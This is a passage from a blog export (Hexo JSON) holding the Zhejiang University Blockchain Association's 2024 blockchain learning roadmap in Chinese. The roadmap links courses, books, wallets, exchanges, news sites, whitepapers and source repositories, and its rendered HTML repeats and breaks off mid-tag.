有一些书籍：《产业区块链》（豆瓣介绍[🔗](https://book.douban.com/subject/35030217/)，腾讯系的区块链实践，马化腾作序，可以起到一些了解的作用）\n\n## 第一百层\n\n> 浩瀚无垠，分头突围\n\n## 其他优质资源\n\n-   awesome-blockchain：[🔗](https://github.com/chaozh/awesome-blockchain-cn)\n-   awesome-metaverse：[🔗](https://github.com/M3-org/awesome-metaverse)\n-   awesome-zjubca：[🔗](https://github.com/Blockchain-zju/awesome-zjubca)\n-   Journey-to-become-a-Blockchain-Engineer: [🔗](https://github.com/spo0ds/Journey-to-become-a-Blockchain-Engineer)\n\n多用 Google，多逛国外论坛，多水群，时刻关注区块链前沿。\n\n## 大气层\n\n从狭义区块链的视角转向广义区块链的视角：Web3。\n\n> 区块链是手段，Web3 是目的。\n\n-   Web3-WIKI：[🔗](https://github.com/Web3-Club/Web3wiki-Website)\n\n## 太空宇宙\n\n> Metaverse：下一代互联网/数字世界的形态。\n\n-   Metaverse-WIKI：[🔗](https://en.wikipedia.org/wiki/Metaverse)\n","slug":"BlockChain/Road/01-区块链基本路线","published":1,"updated":"2024-08-01T16:09:13.615Z","comments":1,"layout":"post","photos":[],"_id":"clzbh821e00032sun4x4xe0am","content":"<h1 id=\"blockchainer-roadmap-2024\"><a href=\"#blockchainer-roadmap-2024\" class=\"headerlink\" title=\"blockchainer-roadmap 2024\"></a>blockchainer-roadmap 2024</h1><p>区块链者学习路线 2024🚀🚀🚀🚀</p>\n<p>—— By 浙江大学区块链协会（Zhejiang University BlockChain Association, ZJUBCA）</p>\n<p>在总结过往学习资料、路线的基础上，结合最新的区块链前沿技术，制定了本学习路线 🎨。</p>\n<h2 id=\"第一层\"><a href=\"#第一层\" class=\"headerlink\" title=\"第一层\"></a>第一层</h2><p>区块链入门</p>\n<ul>\n<li><strong>纪录片</strong><ul>\n<li>《区块链之新》6 集，小小名人录 <a href=\"https://www.bilibili.com/bangumi/play/ep290332?from=search&seid=4820733908948631673\">🔗</a></li>\n</ul>\n</li>\n<li><strong>网课</strong><ul>\n<li>区块链技术与应用，北大肖臻老师出品，内容极佳 <a href=\"https://www.bilibili.com/video/av37065233\">🔗</a> 笔记 <a href=\"https://github.com/CSWellesSun/CSNotes/blob/main/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF%E4%B8%8E%E5%BA%94%E7%94%A8/Note/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF%E4%B8%8E%E5%BA%94%E7%94%A8.md\">🔗</a></li>\n<li>WTF Academy，开发者的 Web3 开源大学 <a href=\"https://www.wtf.academy/\">🔗</a></li>\n<li>DeFi 去中心化金融，UCB 课程 <a href=\"https://www.bilibili.com/video/BV1iV4y1T7iL/\">🔗</a></li>\n<li>DAPP 开发入门，新手友好 <a href=\"https://guoyu.mirror.xyz/RD-xkpoxasAU7x5MIJmiCX4gll3Cs0pAd5iM258S1Ek\">🔗</a></li>\n<li>Crypto Zombie，通过完成一个小游戏来学习 DAPP 开发 <a href=\"https://cryptozombies.io/\">🔗</a></li>\n<li>Solidity 入门，以太坊开发 <a href=\"https://blog.chain.link/learn-blockchain-full-stack-web3-javascript-smart-contract-development-zh/\">🔗</a></li>\n<li>ZK 入门 <a href=\"https://zkhack.dev/whiteboard/module-one/\">🔗</a> 还有个没什么公式代码的书<a href=\"https://learn.z2o-k7e.world/zkp-intro/toc.html\">🔗</a></li>\n</ul>\n</li>\n<li><strong>书籍</strong><ul>\n<li>《Mastering Bitcoin》，公认的区块链 1.0 的最好的书，涉及技术部分也较多 <a href=\"https://berryjam.gitbook.io/mastering-bitcoin-3rd\">🔗</a></li>\n<li>《Inevitable Ethereum》<a href=\"https://inevitableeth.com/\">🔗</a> 以太坊基本概念的科普</li>\n<li>《区块链黑暗森林自救手册》<a href=\"https://github.com/slowmist/Blockchain-dark-forest-selfguard-handbook\">🔗</a> 慢雾出品，降低资产风险</li>\n<li>《区块链红宝书–最接地气的币圈词典》<a href=\"https://www.btc8686.com/wp-content/uploads/2022/02/%E5%8C%BA%E5%9D%97%E9%93%BE%E7%BA%A2%E5%AE%9D%E4%B9%A6%E6%96%B0.pdf\">🔗</a> 《Web3 黑话汇总》<a href=\"https://github.com/WTFAcademy/WTF-gm\">🔗</a> 一些常用的缩写</li>\n</ul>\n</li>\n<li><strong>常用数字货币钱包</strong><ul>\n<li>MetaMusk：EVM 最常用钱包 <a href=\"https://metamask.io/\">🔗</a></li>\n<li>OKX：支持公链最多，用户体验极好 <a href=\"https://www.okx.com/zh-hans/web3\">🔗</a></li>\n<li>Unisat：BTC 常用钱包 <a href=\"https://unisat.io/\">🔗</a></li>\n<li>Phantom：SOL 常用钱包 <a href=\"https://phantom.app/\">🔗</a></li>\n<li>Trust Wallet <a href=\"https://www.trustwallet.com/\">🔗</a></li>\n<li>其他 <a href=\"https://www.coincarp.com/zh/wallets/\">🔗</a></li>\n</ul>\n</li>\n<li><strong>常用数字货币行情软件</strong><ul>\n<li>CoinGecko <a href=\"https://www.coingecko.com/\">🔗</a></li>\n<li>CoinMarkCap <a href=\"https://coinmarketcap.com/\">🔗</a></li>\n</ul>\n</li>\n<li><strong>主流交易所</strong><ul>\n<li>CEX<ul>\n<li>币安 <a href=\"https://www.binance.com/zh-CN\">🔗</a></li>\n<li>OKX <a href=\"https://www.okx.com/\">🔗</a></li>\n<li>其他 <a href=\"https://www.coincarp.com/zh/exchanges/\">🔗</a></li>\n</ul>\n</li>\n<li>DEX<ul>\n<li>EVM DEX：Uniswap <a href=\"https://uniswap.org/\">🔗</a></li>\n<li>SOL DEX：Raydium <a href=\"https://raydium.io/\">🔗</a> Jupiter <a href=\"https://jup.ag/\">🔗</a></li>\n<li>PancakeSwap，支持多链 <a href=\"https://pancakeswap.finance/\">🔗</a></li>\n<li>其他 <a href=\"https://www.coincarp.com/zh/exchanges/dex/\">🔗</a></li>\n</ul>\n</li>\n<li>NFT 市场<ul>\n<li>ETH 市场：Opensea <a href=\"https://opensea.io/\">🔗</a> Blur <a href=\"https://blur.io/\">🔗</a></li>\n<li>MagicEden：多链，包括 BTC NFT 和符文 <a href=\"https://magiceden.io/\">🔗</a></li>\n<li>OKX Web3 Marketplace：多链，包括 BTC NFT、铭文、符文和 Atom <a href=\"https://www.okx.com/zh-hans/web3/marketplace/nft\">🔗</a></li>\n<li>铭文、符文、Atom、RGB 市场<ul>\n<li>OKX：最主流使用的 Web3 市场 <a href=\"https://www.okx.com/zh-hans/web3/marketplace/nft\">🔗</a></li>\n<li>Unisat Market <a href=\"https://unisat.io/market\">🔗</a></li>\n<li>RGB 市场仍在发展：HueHub <a href=\"https://huehub.xyz/\">🔗</a> Nomadland <a href=\"https://market.nomadland.io/#/trade/info?id=0\">🔗</a></li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><strong>社交媒体资讯</strong><ul>\n<li>X (Twitter)<ul>\n<li>吴说 <a href=\"https://twitter.com/WuBlockchain\">🔗</a></li>\n<li>Twitter 加密货币消息聚合平台 <a href=\"https://www.coinfeeds.io/news\">🔗</a></li>\n</ul>\n</li>\n<li>网站<ul>\n<li>cointelegraph <a href=\"https://cointelegraph.com/\">🔗</a></li>\n<li>the block <a href=\"https://www.theblock.co/\">🔗</a></li>\n<li>web3Caff <a href=\"https://web3caff.com/zh/\">🔗</a></li>\n<li>Medium <a href=\"https://medium.com/\">🔗</a></li>\n<li>登链社区 <a href=\"https://learnblockchain.cn/\">🔗</a></li>\n<li>比特币生态资源导航 <a href=\"https://123btc.org/\">🔗</a></li>\n</ul>\n</li>\n<li>Newsletter<ul>\n<li>coinbase 每周咨询 <a href=\"https://www.coinbase.com/bytes\">🔗</a></li>\n<li>TLDR Newsletter (5min 科技新闻) <a href=\"https://tldr.tech/\">🔗</a></li>\n</ul>\n</li>\n<li>媒体：<ul>\n<li>Foresight News <a href=\"https://foresightnews.pro/\">🔗</a></li>\n<li>Odaily 星球日报 <a href=\"https://www.odaily.news/\">🔗</a></li>\n<li>BlockBeats <a href=\"https://theblockbeats.info/\">🔗</a></li>\n<li>PANews <a href=\"https://www.panewslab.com/\">🔗</a></li>\n<li>TechFlow 深潮 <a href=\"https://www.techflowpost.com/\">🔗</a></li>\n</ul>\n</li>\n</ul>\n</li>\n<li><strong>风险须知</strong><ul>\n<li>遵守国家法律法规！</li>\n<li>dyor，都是可选项，不是必选项。</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"第二层\"><a href=\"#第二层\" class=\"headerlink\" title=\"第二层\"></a>第二层</h2><p>有了入门的基础后，其实接下去都是一些可选的专题，对其中感兴趣的专题可以进行了解与学习。</p>\n<ul>\n<li><p><strong>技术向</strong>：</p>\n<ul>\n<li><p>密码学：</p>\n<ul>\n<li>文章：介绍了简单的 <code>secp256k1</code>签名算法、比特币交易签名、 <code>schnorr</code> 多签 <a href=\"https://www.btcstudy.org/2022/06/13/part-2-bitcoin-p2tr-transaction-breakdown/\">🔗</a></li>\n<li><a href=\"https://github.com/paulmillr/noble-secp256k1\">noble-secp256k1</a>：<code>secp256k1</code> 签名和 <code>ECDH</code> 的最快 4KB JS 实现。极其简洁，但内容完整且经过算法优化，非常适合从底层了解签名算法。作者还专门写了一篇介绍椭圆曲线算法加速的文章 <a href=\"https://paulmillr.com/posts/noble-secp256k1-fast-ecc/\">🔗</a></li>\n<li>文章：介绍基于 <code>schnorr</code> 签名算法的 <code>musig</code> 多签名，可用于设计链下多签名。<a href=\"https://blog.blockstream.com/en-musig-a-new-multisignature-standard/\">🔗</a> 这里还有一个 typescript 的实现 <a href=\"https://github.com/wangshouh/musig\">🔗</a></li>\n</ul>\n</li>\n<li><p>共识算法：</p>\n<ul>\n<li>PoW 相关：<a href=\"https://github.com/indutny/proof-of-work\">🔗</a></li>\n<li>PoS：<a href=\"https://github.com/ethereum/consensus-specs\">🔗</a></li>\n<li>PBFT：<a href=\"https://pmg.csail.mit.edu/papers/osdi99.pdf\">🔗</a></li>\n<li>dpos+pbft 算法分析：<a href=\"https://github.com/sqfasd/dpos-pbft\">🔗</a></li>\n<li>PoH：<a href=\"https://docs.solanalabs.com/implemented-proposals/tower-bft#vote-tower\">🔗</a></li>\n<li>DAG：<ul>\n<li>IOTA：<a href=\"https://docs.iota.org/introduction\">🔗</a></li>\n<li>Byteball：<a href=\"https://byteball.org/\">🔗</a></li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>智能合约：</p>\n<ul>\n<li>智能合约开发是区块链应用的基础，不同区块链平台的智能合约可能不太一样，但是大多数都是借鉴了以太坊的智能合约，对于公有链领域，搞懂以太坊及其智能合约是首要的。和前面一样，可以去阅读以太坊的官方文档，也可以看一些书。</li>\n<li>以太坊官方文档：<a href=\"https://ethereum.org/en/developers/docs/\">🔗</a></li>\n<li>Solidity 最新文档（可以切换版本查看其他版本的文档）：<a href=\"https://docs.soliditylang.org/en/latest/\">🔗</a></li>\n<li>书籍：《精通以太坊》<a href=\"https://github.com/ethereumbook/ethereumbook\">🔗</a>，主要就是介绍以太坊，以及如何在以太坊上写智能合约，以太坊 CTO 著，好书，至今依然在更新</li>\n<li>除了以太坊以外，还可以了解波卡、Polygon 和 Dfinity 等公有区块链。对于联盟链的智能合约，如 Hyperledger Fabric，可以自行找一些书或者文档看。</li>\n<li>以太坊 Dapp 开发学习路线：<a href=\"eth/eth_dapp.md\">🔗</a></li>\n<li>SOL 开发教程，非常详细 <a href=\"https://www.soldev.app/course\">🔗</a></li>\n</ul>\n</li>\n<li><p>虚拟机：</p>\n<ul>\n<li>evm<ul>\n<li>evm-awesome-list：<a href=\"https://ethereum.org/en/developers/docs/evm/\">🔗</a>，以太坊开发者官方文档</li>\n<li>evm 解析：<a href=\"https://github.com/CoinCulture/evm-tools/blob/master/analysis/guide.md\">🔗</a>，这是了解 EVM、它与 Solidity 的关系以及如何使用一些调试工具的指南。</li>\n<li>文章：使用 yul 汇编深入理解 solidity 和 evm 的底层技术 <a href=\"https://mirror.xyz/0xB38709B8198d147cc9Ff9C133838a044d78B064B/nk40v2MJKSHXXNSlbqqhpwJf4MtZ9V2Vp8P_bSNwjYc\">🔗</a>, 小白科普向，一共有三篇</li>\n<li><a href=\"https://www.evm.codes/\">EVM Codes</a>：探索 evm 和 solidity 底层必备工具，可以快速查找 Opcodes 操作码和 Precompiled 预编译函数的具体功能、用法和 gas 情况。另一个有用的工具是 <a href=\"https://book.getfoundry.sh/forge/debugger\">forge debugger</a></li>\n</ul>\n</li>\n<li>wasm（WebAssembly）<ul>\n<li>eth-ewasm：<a href=\"https://github.com/ewasm\">🔗</a></li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>去中心化存储</p>\n<ul>\n<li>IPFS&#x2F;Filecoin：<a href=\"https://github.com/Blockchain-zju/blockchainer-roadmap/tree/master/ipfs\">🔗</a></li>\n</ul>\n</li>\n<li><p>跨链：</p>\n<ul>\n<li>跨链是目前区块链最前沿的技术，也是未来发展的重要方向之一</li>\n<li>论文：V 神总结的区块链互操作性文章：Buterin V. Chain interoperabilit <a href=\"https://www.r3.com/wp-content/uploads/2017/06/chain_interoperability_r3.pdf\">🔗</a></li>\n<li>一些不错的博客文章：<ul>\n<li>关于跨链技术的分析与思考：<a href=\"https://mp.weixin.qq.com/s/fgRPwzVPB3Si5aHSCACvAg\">🔗</a></li>\n<li>跨链通信简要研究：<a href=\"https://mp.weixin.qq.com/s/X7ztDBG6kqgrBaGwrrsfQw\">🔗</a></li>\n</ul>\n</li>\n<li>论文：Polkadot 最新的论文：Overview of Polkadot and its Design Considerations<a href=\"https://eprint.iacr.org/2020/641.pdf\">🔗</a></li>\n<li>国际最领先的跨链平台 Polkadot 源码（rust）：<a href=\"https://github.com/paritytech/polkadot\">🔗</a></li>\n<li>国内最领先的跨链平台 BitXHub 源码（go）：<a href=\"https://github.com/meshplus/bitxhub\">🔗</a></li>\n<li>有兴趣有精力的还可以了解下 Subtrate：<a href=\"https://substrate.dev/\">🔗</a></li>\n</ul>\n</li>\n<li><p>DeFi</p>\n<ul>\n<li>安全<ul>\n<li>文章：16个 solidity合约漏洞，修复和真实世界的案例 <a href=\"https://hackernoon.com/hackpedia-16-solidity-hacks-vulnerabilities-their-fixes-and-real-world-examples-f3210eba5148\">🔗</a></li>\n<li>工具：<ul>\n<li><a href=\"https://github.com/SunWeb3Sec/DeFiHackLabs\">DeFiHackLabs</a>：收录了很多资安事件的概念性验证程序</li>\n<li><a href=\"https://github.com/SunWeb3Sec/DeFiVulnLabs\">DeFiVulnLabs</a>：整理了常见Solidity的漏洞测试与防御方式</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>实现</li>\n</ul>\n</li>\n<li><p>MEV</p>\n</li>\n<li><p><strong>联盟链</strong>：</p>\n<ul>\n<li><strong>联盟链学习 roadmap - 第一层</strong>：<a href=\"consortium/consortium.md\">🔗</a></li>\n<li>联盟链领域只要搞懂了 Hyperledger Fabric、R3 Corda 这两个项目的东西基本上就搞懂了 80%的内容；学习方式可以是直接阅读这些项目上的文档、其他人写的博客、或者看书。</li>\n<li>Hyperledger Fabric 官方文档：<a href=\"https://hyperledger-fabric.readthedocs.io/en/latest/\">🔗</a></li>\n<li>书籍《区块链技术进阶实战》（豆瓣介绍<a href=\"https://book.douban.com/subject/30177480/\">🔗</a>，介绍了 Hyperledger Fabric、以太坊、Hyperchain）</li>\n<li>书籍《区块链原理、设计与应用》（豆瓣介绍<a href=\"https://book.douban.com/subject/27127839/\">🔗</a>，全书都是在讲 Hyperledger Fabric，有源码分析）</li>\n</ul>\n</li>\n<li><p>具体链相关资源</p>\n<ul>\n<li>ETH<ul>\n<li>eth roadmap - 第一层：<a href=\"eth/eth.md\">🔗</a></li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p><strong>商业向</strong>：</p>\n<ul>\n<li>research&#x2F;dataAnalysis：<ul>\n<li>文章：从新闻聚合器到链上分析工具，十大加密研究工具清单 <a href=\"https://abmedia.io/20220726-the-10-must-have-crypto-research-tools\">🔗</a></li>\n<li><a href=\"https://github.com/chainfeeds/RSSAggregatorforWeb3\">🥩 RAW</a>：一个聚合了500多个关于Web3的RSS的仓库，里面讲技术的略少，大量文章关于项目动态</li>\n</ul>\n</li>\n<li>ICO：<ul>\n<li>搜索并了解 ERC-20</li>\n<li>搜索并了解 ICO</li>\n<li>各国对 ICO 的监管态度</li>\n</ul>\n</li>\n<li>爆款区块链应用：<ul>\n<li>搜索并了解加密猫、像素大师</li>\n</ul>\n</li>\n<li>Token：<ul>\n<li>搜索并了解什么是代币经济学</li>\n</ul>\n</li>\n<li>Staking：<ul>\n<li>搜索并了解什么是 Staking Economy</li>\n</ul>\n</li>\n<li><strong>DeFi</strong>：Decentralized Finance<ul>\n<li>搜索并了解什么是 DeFi</li>\n<li>书籍推荐：《How to DeFi》：<a href=\"https://github.com/Blockchain-zju/HistoryFiles/blob/main/defi/How_to_DeFi_CHN.pdf\">🔗</a></li>\n</ul>\n</li>\n<li><strong>NFT</strong>：Non-fungible Token<ul>\n<li><strong>Roadmap-NFT 第一层</strong>：<a href=\"nft/nft.md\">🔗</a></li>\n<li>文章：了解 5 种流行的 NFT 投放方式及其优缺点 <a href=\"https://web3caff.com/zh/archives/23106\">🔗</a></li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"第三层\"><a href=\"#第三层\" class=\"headerlink\" title=\"第三层\"></a>第三层</h2><blockquote>\n<p>越了解，越广阔</p>\n</blockquote>\n<ul>\n<li><p><strong>技术向</strong>：</p>\n<ul>\n<li><p>阅读经典论文&#x2F;文章：</p>\n<ul>\n<li>bitcoin 白皮书：Bitcoin: A Peer-to-Peer Electronic Cash System<a href=\"https://bitcoin.org/bitcoin.pdf\">🔗</a></li>\n<li>以太坊白皮书：Ethereum: A next-generation smart contract and decentralized application platform<a href=\"https://github.com/ethereum/wiki/wiki/White-Paper\">🔗</a><ul>\n<li>如果有能力也应该看下以太坊黄皮书：Ethereum: A secure decentralised generalised transaction ledger<a href=\"https://ethereum.github.io/yellowpaper/paper.pdf\">🔗</a></li>\n<li>以太坊的 wiki：<a href=\"https://github.com/ethereum/wiki/wiki\">🔗</a></li>\n<li>go-ethereum-code-analysis：<a href=\"https://github.com/ZtesoftCS/go-ethereum-code-analysis\">🔗</a></li>\n<li>以太坊源码分析-teaspring 的技术专栏：<a href=\"https://blog.csdn.net/teaspring\">🔗</a></li>\n<li>干货|以太坊分片:overview and finalit：<a href=\"https://ethfans.org/posts/ethereum-sharding-and-finality\">🔗</a></li>\n</ul>\n</li>\n<li>EOS 白皮书：<a href=\"https://github.com/EOSIO/Documentation/blob/master/TechnicalWhitePaper.md\">🔗</a></li>\n<li>Polkadot 白皮书：Polkadot: Vision for a heterogeneous multi-chain framework</li>\n<li>**这 33 篇区块链必读论文 , 读过 5 篇以上的竟不到 1%**：<a href=\"https://www.chainnews.com/articles/363251574672.htm\">🔗</a></li>\n<li>建议可以按照自己感兴趣的主题去<strong>Google Scholar</strong>里搜索，如：blockchain, distribute ledger 等。</li>\n</ul>\n</li>\n<li><p>阅读经典项目源码：</p>\n<ul>\n<li>Bitcoin 源码：<a href=\"https://github.com/bitcoin/bitcoin\">🔗</a></li>\n<li>Ethereum 源码(go-ethereum)：<a href=\"https://github.com/ethereum/go-ethereum\">🔗</a></li>\n<li>EOS 源码：<a href=\"https://github.com/EOSIO/eos\">🔗</a></li>\n<li>Hyperledger Fabric 源码：<a href=\"https://github.com/hyperledger/fabric\">🔗</a></li>\n</ul>\n</li>\n<li><p>ETH2.0：</p>\n<ul>\n<li>了解 ETH1.0 的扩容方案</li>\n<li>了解 ETH2.0 的 Roadmap 路线图</li>\n<li>了解 layer2 和分片的区别</li>\n<li>了解 layer2 最新进展 rollup 的两大方向 optimistic-rollup 和 zk-rollup 的区别</li>\n</ul>\n</li>\n<li><p><strong>联盟链</strong>：</p>\n<ul>\n<li><strong>联盟链学习 roadmap - 第二层</strong>：<a href=\"consortium/consortium.md\">🔗</a></li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p><strong>商业向</strong>（可以在公有链和联盟链中选一个，有精力的话建议全部都搞）：</p>\n<ul>\n<li>公有链方向，深入了解 DeFi 和 NFT：<ul>\n<li><strong>DeFi</strong><ul>\n<li>深入体验多款 DeFi 产品</li>\n<li>了解 DeFi 的生态，阅读一些 DeFi 的研究报告 <a href=\"https://github.com/Blockchain-zju/HistoryFiles/blob/main/defi/defi_report.pdf\">🔗</a></li>\n</ul>\n</li>\n<li><strong>NFT</strong><ul>\n<li>深入体验多款 NFT 产品</li>\n<li><strong>Roadmap-NFT 第二层</strong>：<a href=\"nft/nft.md\">🔗</a></li>\n</ul>\n</li>\n</ul>\n</li>\n<li>联盟链方向，深入了解各个联盟链框架以及联盟链的商业价值和应用实践：<ul>\n<li><strong>联盟链学习 roadmap - 第三层</strong>：<a href=\"consortium/consortium.md\">🔗</a></li>\n<li>存证、溯源、供应链金融、数字身份、政务、版权保护….</li>\n<li>建议先看《2018 年中国区块链产业白皮书》，虽然目前已经是 2020 年了，但是这个报告确实不错</li>\n<li>有一些书籍：《产业区块链》（豆瓣介绍<a href=\"https://book.douban.com/subject/35030217/\">🔗</a>，腾讯系的区块链实践，马化腾作序，可以起到一些了解的作用）</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"第一百层\"><a href=\"#第一百层\" class=\"headerlink\" title=\"第一百层\"></a>第一百层</h2><blockquote>\n<p>浩瀚无垠，分头突围</p>\n</blockquote>\n<h2 id=\"其他优质资源\"><a href=\"#其他优质资源\" class=\"headerlink\" title=\"其他优质资源\"></a>其他优质资源</h2><ul>\n<li>awesome-blockchain：<a href=\"https://github.com/chaozh/awesome-blockchain-cn\">🔗</a></li>\n<li>awesome-metaverse：<a href=\"https://github.com/M3-org/awesome-metaverse\">🔗</a></li>\n<li>awesome-zjubca：<a href=\"https://github.com/Blockchain-zju/awesome-zjubca\">🔗</a></li>\n<li>Journey-to-become-a-Blockchain-Engineer: <a href=\"https://github.com/spo0ds/Journey-to-become-a-Blockchain-Engineer\">🔗</a></li>\n</ul>\n<p>多用 Google，多逛国外论坛，多水群，时刻关注区块链前沿。</p>\n<h2 id=\"大气层\"><a href=\"#大气层\" class=\"headerlink\" title=\"大气层\"></a>大气层</h2><p>从狭义区块链的视角转向广义区块链的视角：Web3。</p>\n<blockquote>\n<p>区块链是手段，Web3 是目的。</p>\n</blockquote>\n<ul>\n<li>Web3-WIKI：<a href=\"https://github.com/Web3-Club/Web3wiki-Website\">🔗</a></li>\n</ul>\n<h2 id=\"太空宇宙\"><a href=\"#太空宇宙\" class=\"headerlink\" title=\"太空宇宙\"></a>太空宇宙</h2><blockquote>\n<p>Metaverse：下一代互联网&#x2F;数字世界的形态。</p>\n</blockquote>\n<ul>\n<li>Metaverse-WIKI：<a href=\"https://en.wikipedia.org/wiki/Metaverse\">🔗</a></li>\n</ul>\n","excerpt":"","more":"<h1 id=\"blockchainer-roadmap-2024\"><a href=\"#blockchainer-roadmap-2024\" class=\"headerlink\" title=\"blockchainer-roadmap 2024\"></a>blockchainer-roadmap 2024</h1><p>区块链者学习路线 2024🚀🚀🚀🚀</p>\n<p>—— By 浙江大学区块链协会（Zhejiang University BlockChain Association, ZJUBCA）</p>\n<p>在总结过往学习资料、路线的基础上，结合最新的区块链前沿技术，制定了本学习路线 🎨。</p>\n<h2 id=\"第一层\"><a href=\"#第一层\" class=\"headerlink\" title=\"第一层\"></a>第一层</h2><p>区块链入门</p>\n<ul>\n<li><strong>纪录片</strong><ul>\n<li>《区块链之新》6 集，小小名人录 <a href=\"https://www.bilibili.com/bangumi/play/ep290332?from=search&seid=4820733908948631673\">🔗</a></li>\n</ul>\n</li>\n<li><strong>网课</strong><ul>\n<li>区块链技术与应用，北大肖臻老师出品，内容极佳 <a href=\"https://www.bilibili.com/video/av37065233\">🔗</a> 笔记 <a href=\"https://github.com/CSWellesSun/CSNotes/blob/main/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF%E4%B8%8E%E5%BA%94%E7%94%A8/Note/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF%E4%B8%8E%E5%BA%94%E7%94%A8.md\">🔗</a></li>\n<li>WTF Academy，开发者的 Web3 开源大学 <a href=\"https://www.wtf.academy/\">🔗</a></li>\n<li>DeFi 去中心化金融，UCB 课程 <a href=\"https://www.bilibili.com/video/BV1iV4y1T7iL/\">🔗</a></li>\n<li>DAPP 开发入门，新手友好 <a href=\"https://guoyu.mirror.xyz/RD-xkpoxasAU7x5MIJmiCX4gll3Cs0pAd5iM258S1Ek\">🔗</a></li>\n<li>Crypto Zombie，通过完成一个小游戏来学习 DAPP 开发 <a href=\"https://cryptozombies.io/\">🔗</a></li>\n<li>Solidity 入门，以太坊开发 <a href=\"https://blog.chain.link/learn-blockchain-full-stack-web3-javascript-smart-contract-development-zh/\">🔗</a></li>\n<li>ZK 入门 <a href=\"https://zkhack.dev/whiteboard/module-one/\">🔗</a> 还有个没什么公式代码的书<a href=\"https://learn.z2o-k7e.world/zkp-intro/toc.html\">🔗</a></li>\n</ul>\n</li>\n<li><strong>书籍</strong><ul>\n<li>《Mastering Bitcoin》，公认的区块链 1.0 的最好的书，涉及技术部分也较多 <a href=\"https://berryjam.gitbook.io/mastering-bitcoin-3rd\">🔗</a></li>\n<li>《Inevitable Ethereum》<a href=\"https://inevitableeth.com/\">🔗</a> 以太坊基本概念的科普</li>\n<li>《区块链黑暗森林自救手册》<a href=\"https://github.com/slowmist/Blockchain-dark-forest-selfguard-handbook\">🔗</a> 慢雾出品，降低资产风险</li>\n<li>《区块链红宝书–最接地气的币圈词典》<a href=\"https://www.btc8686.com/wp-content/uploads/2022/02/%E5%8C%BA%E5%9D%97%E9%93%BE%E7%BA%A2%E5%AE%9D%E4%B9%A6%E6%96%B0.pdf\">🔗</a> 《Web3 黑话汇总》<a href=\"https://github.com/WTFAcademy/WTF-gm\">🔗</a> 一些常用的缩写</li>\n</ul>\n</li>\n<li><strong>常用数字货币钱包</strong><ul>\n<li>MetaMusk：EVM 最常用钱包 <a href=\"https://metamask.io/\">🔗</a></li>\n<li>OKX：支持公链最多，用户体验极好 <a href=\"https://www.okx.com/zh-hans/web3\">🔗</a></li>\n<li>Unisat：BTC 常用钱包 <a href=\"https://unisat.io/\">🔗</a></li>\n<li>Phantom：SOL 常用钱包 <a href=\"https://phantom.app/\">🔗</a></li>\n<li>Trust Wallet <a href=\"https://www.trustwallet.com/\">🔗</a></li>\n<li>其他 <a href=\"https://www.coincarp.com/zh/wallets/\">🔗</a></li>\n</ul>\n</li>\n<li><strong>常用数字货币行情软件</strong><ul>\n<li>CoinGecko <a href=\"https://www.coingecko.com/\">🔗</a></li>\n<li>CoinMarkCap <a href=\"https://coinmarketcap.com/\">🔗</a></li>\n</ul>\n</li>\n<li><strong>主流交易所</strong><ul>\n<li>CEX<ul>\n<li>币安 <a href=\"https://www.binance.com/zh-CN\">🔗</a></li>\n<li>OKX <a href=\"https://www.okx.com/\">🔗</a></li>\n<li>其他 <a href=\"https://www.coincarp.com/zh/exchanges/\">🔗</a></li>\n</ul>\n</li>\n<li>DEX<ul>\n<li>EVM DEX：Uniswap <a href=\"https://uniswap.org/\">🔗</a></li>\n<li>SOL DEX：Raydium <a href=\"https://raydium.io/\">🔗</a> Jupiter <a href=\"https://jup.ag/\">🔗</a></li>\n<li>PancakeSwap，支持多链 <a href=\"https://pancakeswap.finance/\">🔗</a></li>\n<li>其他 <a href=\"https://www.coincarp.com/zh/exchanges/dex/\">🔗</a></li>\n</ul>\n</li>\n<li>NFT 市场<ul>\n<li>ETH 市场：Opensea <a href=\"https://opensea.io/\">🔗</a> Blur <a href=\"https://blur.io/\">🔗</a></li>\n<li>MagicEden：多链，包括 BTC NFT 和符文 <a href=\"https://magiceden.io/\">🔗</a></li>\n<li>OKX Web3 Marketplace：多链，包括 BTC NFT、铭文、符文和 Atom <a href=\"https://www.okx.com/zh-hans/web3/marketplace/nft\">🔗</a></li>\n<li>铭文、符文、Atom、RGB 市场<ul>\n<li>OKX：最主流使用的 Web3 市场 <a href=\"https://www.okx.com/zh-hans/web3/marketplace/nft\">🔗</a></li>\n<li>Unisat Market <a href=\"https://unisat.io/market\">🔗</a></li>\n<li>RGB 市场仍在发展：HueHub <a href=\"https://huehub.xyz/\">🔗</a> Nomadland <a href=\"https://market.nomadland.io/#/trade/info?id=0\">🔗</a></li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><strong>社交媒体资讯</strong><ul>\n<li>X (Twitter)<ul>\n<li>吴说 <a href=\"https://twitter.com/WuBlockchain\">🔗</a></li>\n<li>Twitter 加密货币消息聚合平台 <a href=\"https://www.coinfeeds.io/news\">🔗</a></li>\n</ul>\n</li>\n<li>网站<ul>\n<li>cointelegraph <a href=\"https://cointelegraph.com/\">🔗</a></li>\n<li>the block <a href=\"https://www.theblock.co/\">🔗</a></li>\n<li>web3Caff <a href=\"https://web3caff.com/zh/\">🔗</a></li>\n<li>Medium <a href=\"https://medium.com/\">🔗</a></li>\n<li>登链社区 <a href=\"https://learnblockchain.cn/\">🔗</a></li>\n<li>比特币生态资源导航 <a href=\"https://123btc.org/\">🔗</a></li>\n</ul>\n</li>\n<li>Newsletter<ul>\n<li>coinbase 每周咨询 <a href=\"https://www.coinbase.com/bytes\">🔗</a></li>\n<li>TLDR Newsletter (5min 科技新闻) <a href=\"https://tldr.tech/\">🔗</a></li>\n</ul>\n</li>\n<li>媒体：<ul>\n<li>Foresight News <a href=\"https://foresightnews.pro/\">🔗</a></li>\n<li>Odaily 星球日报 <a 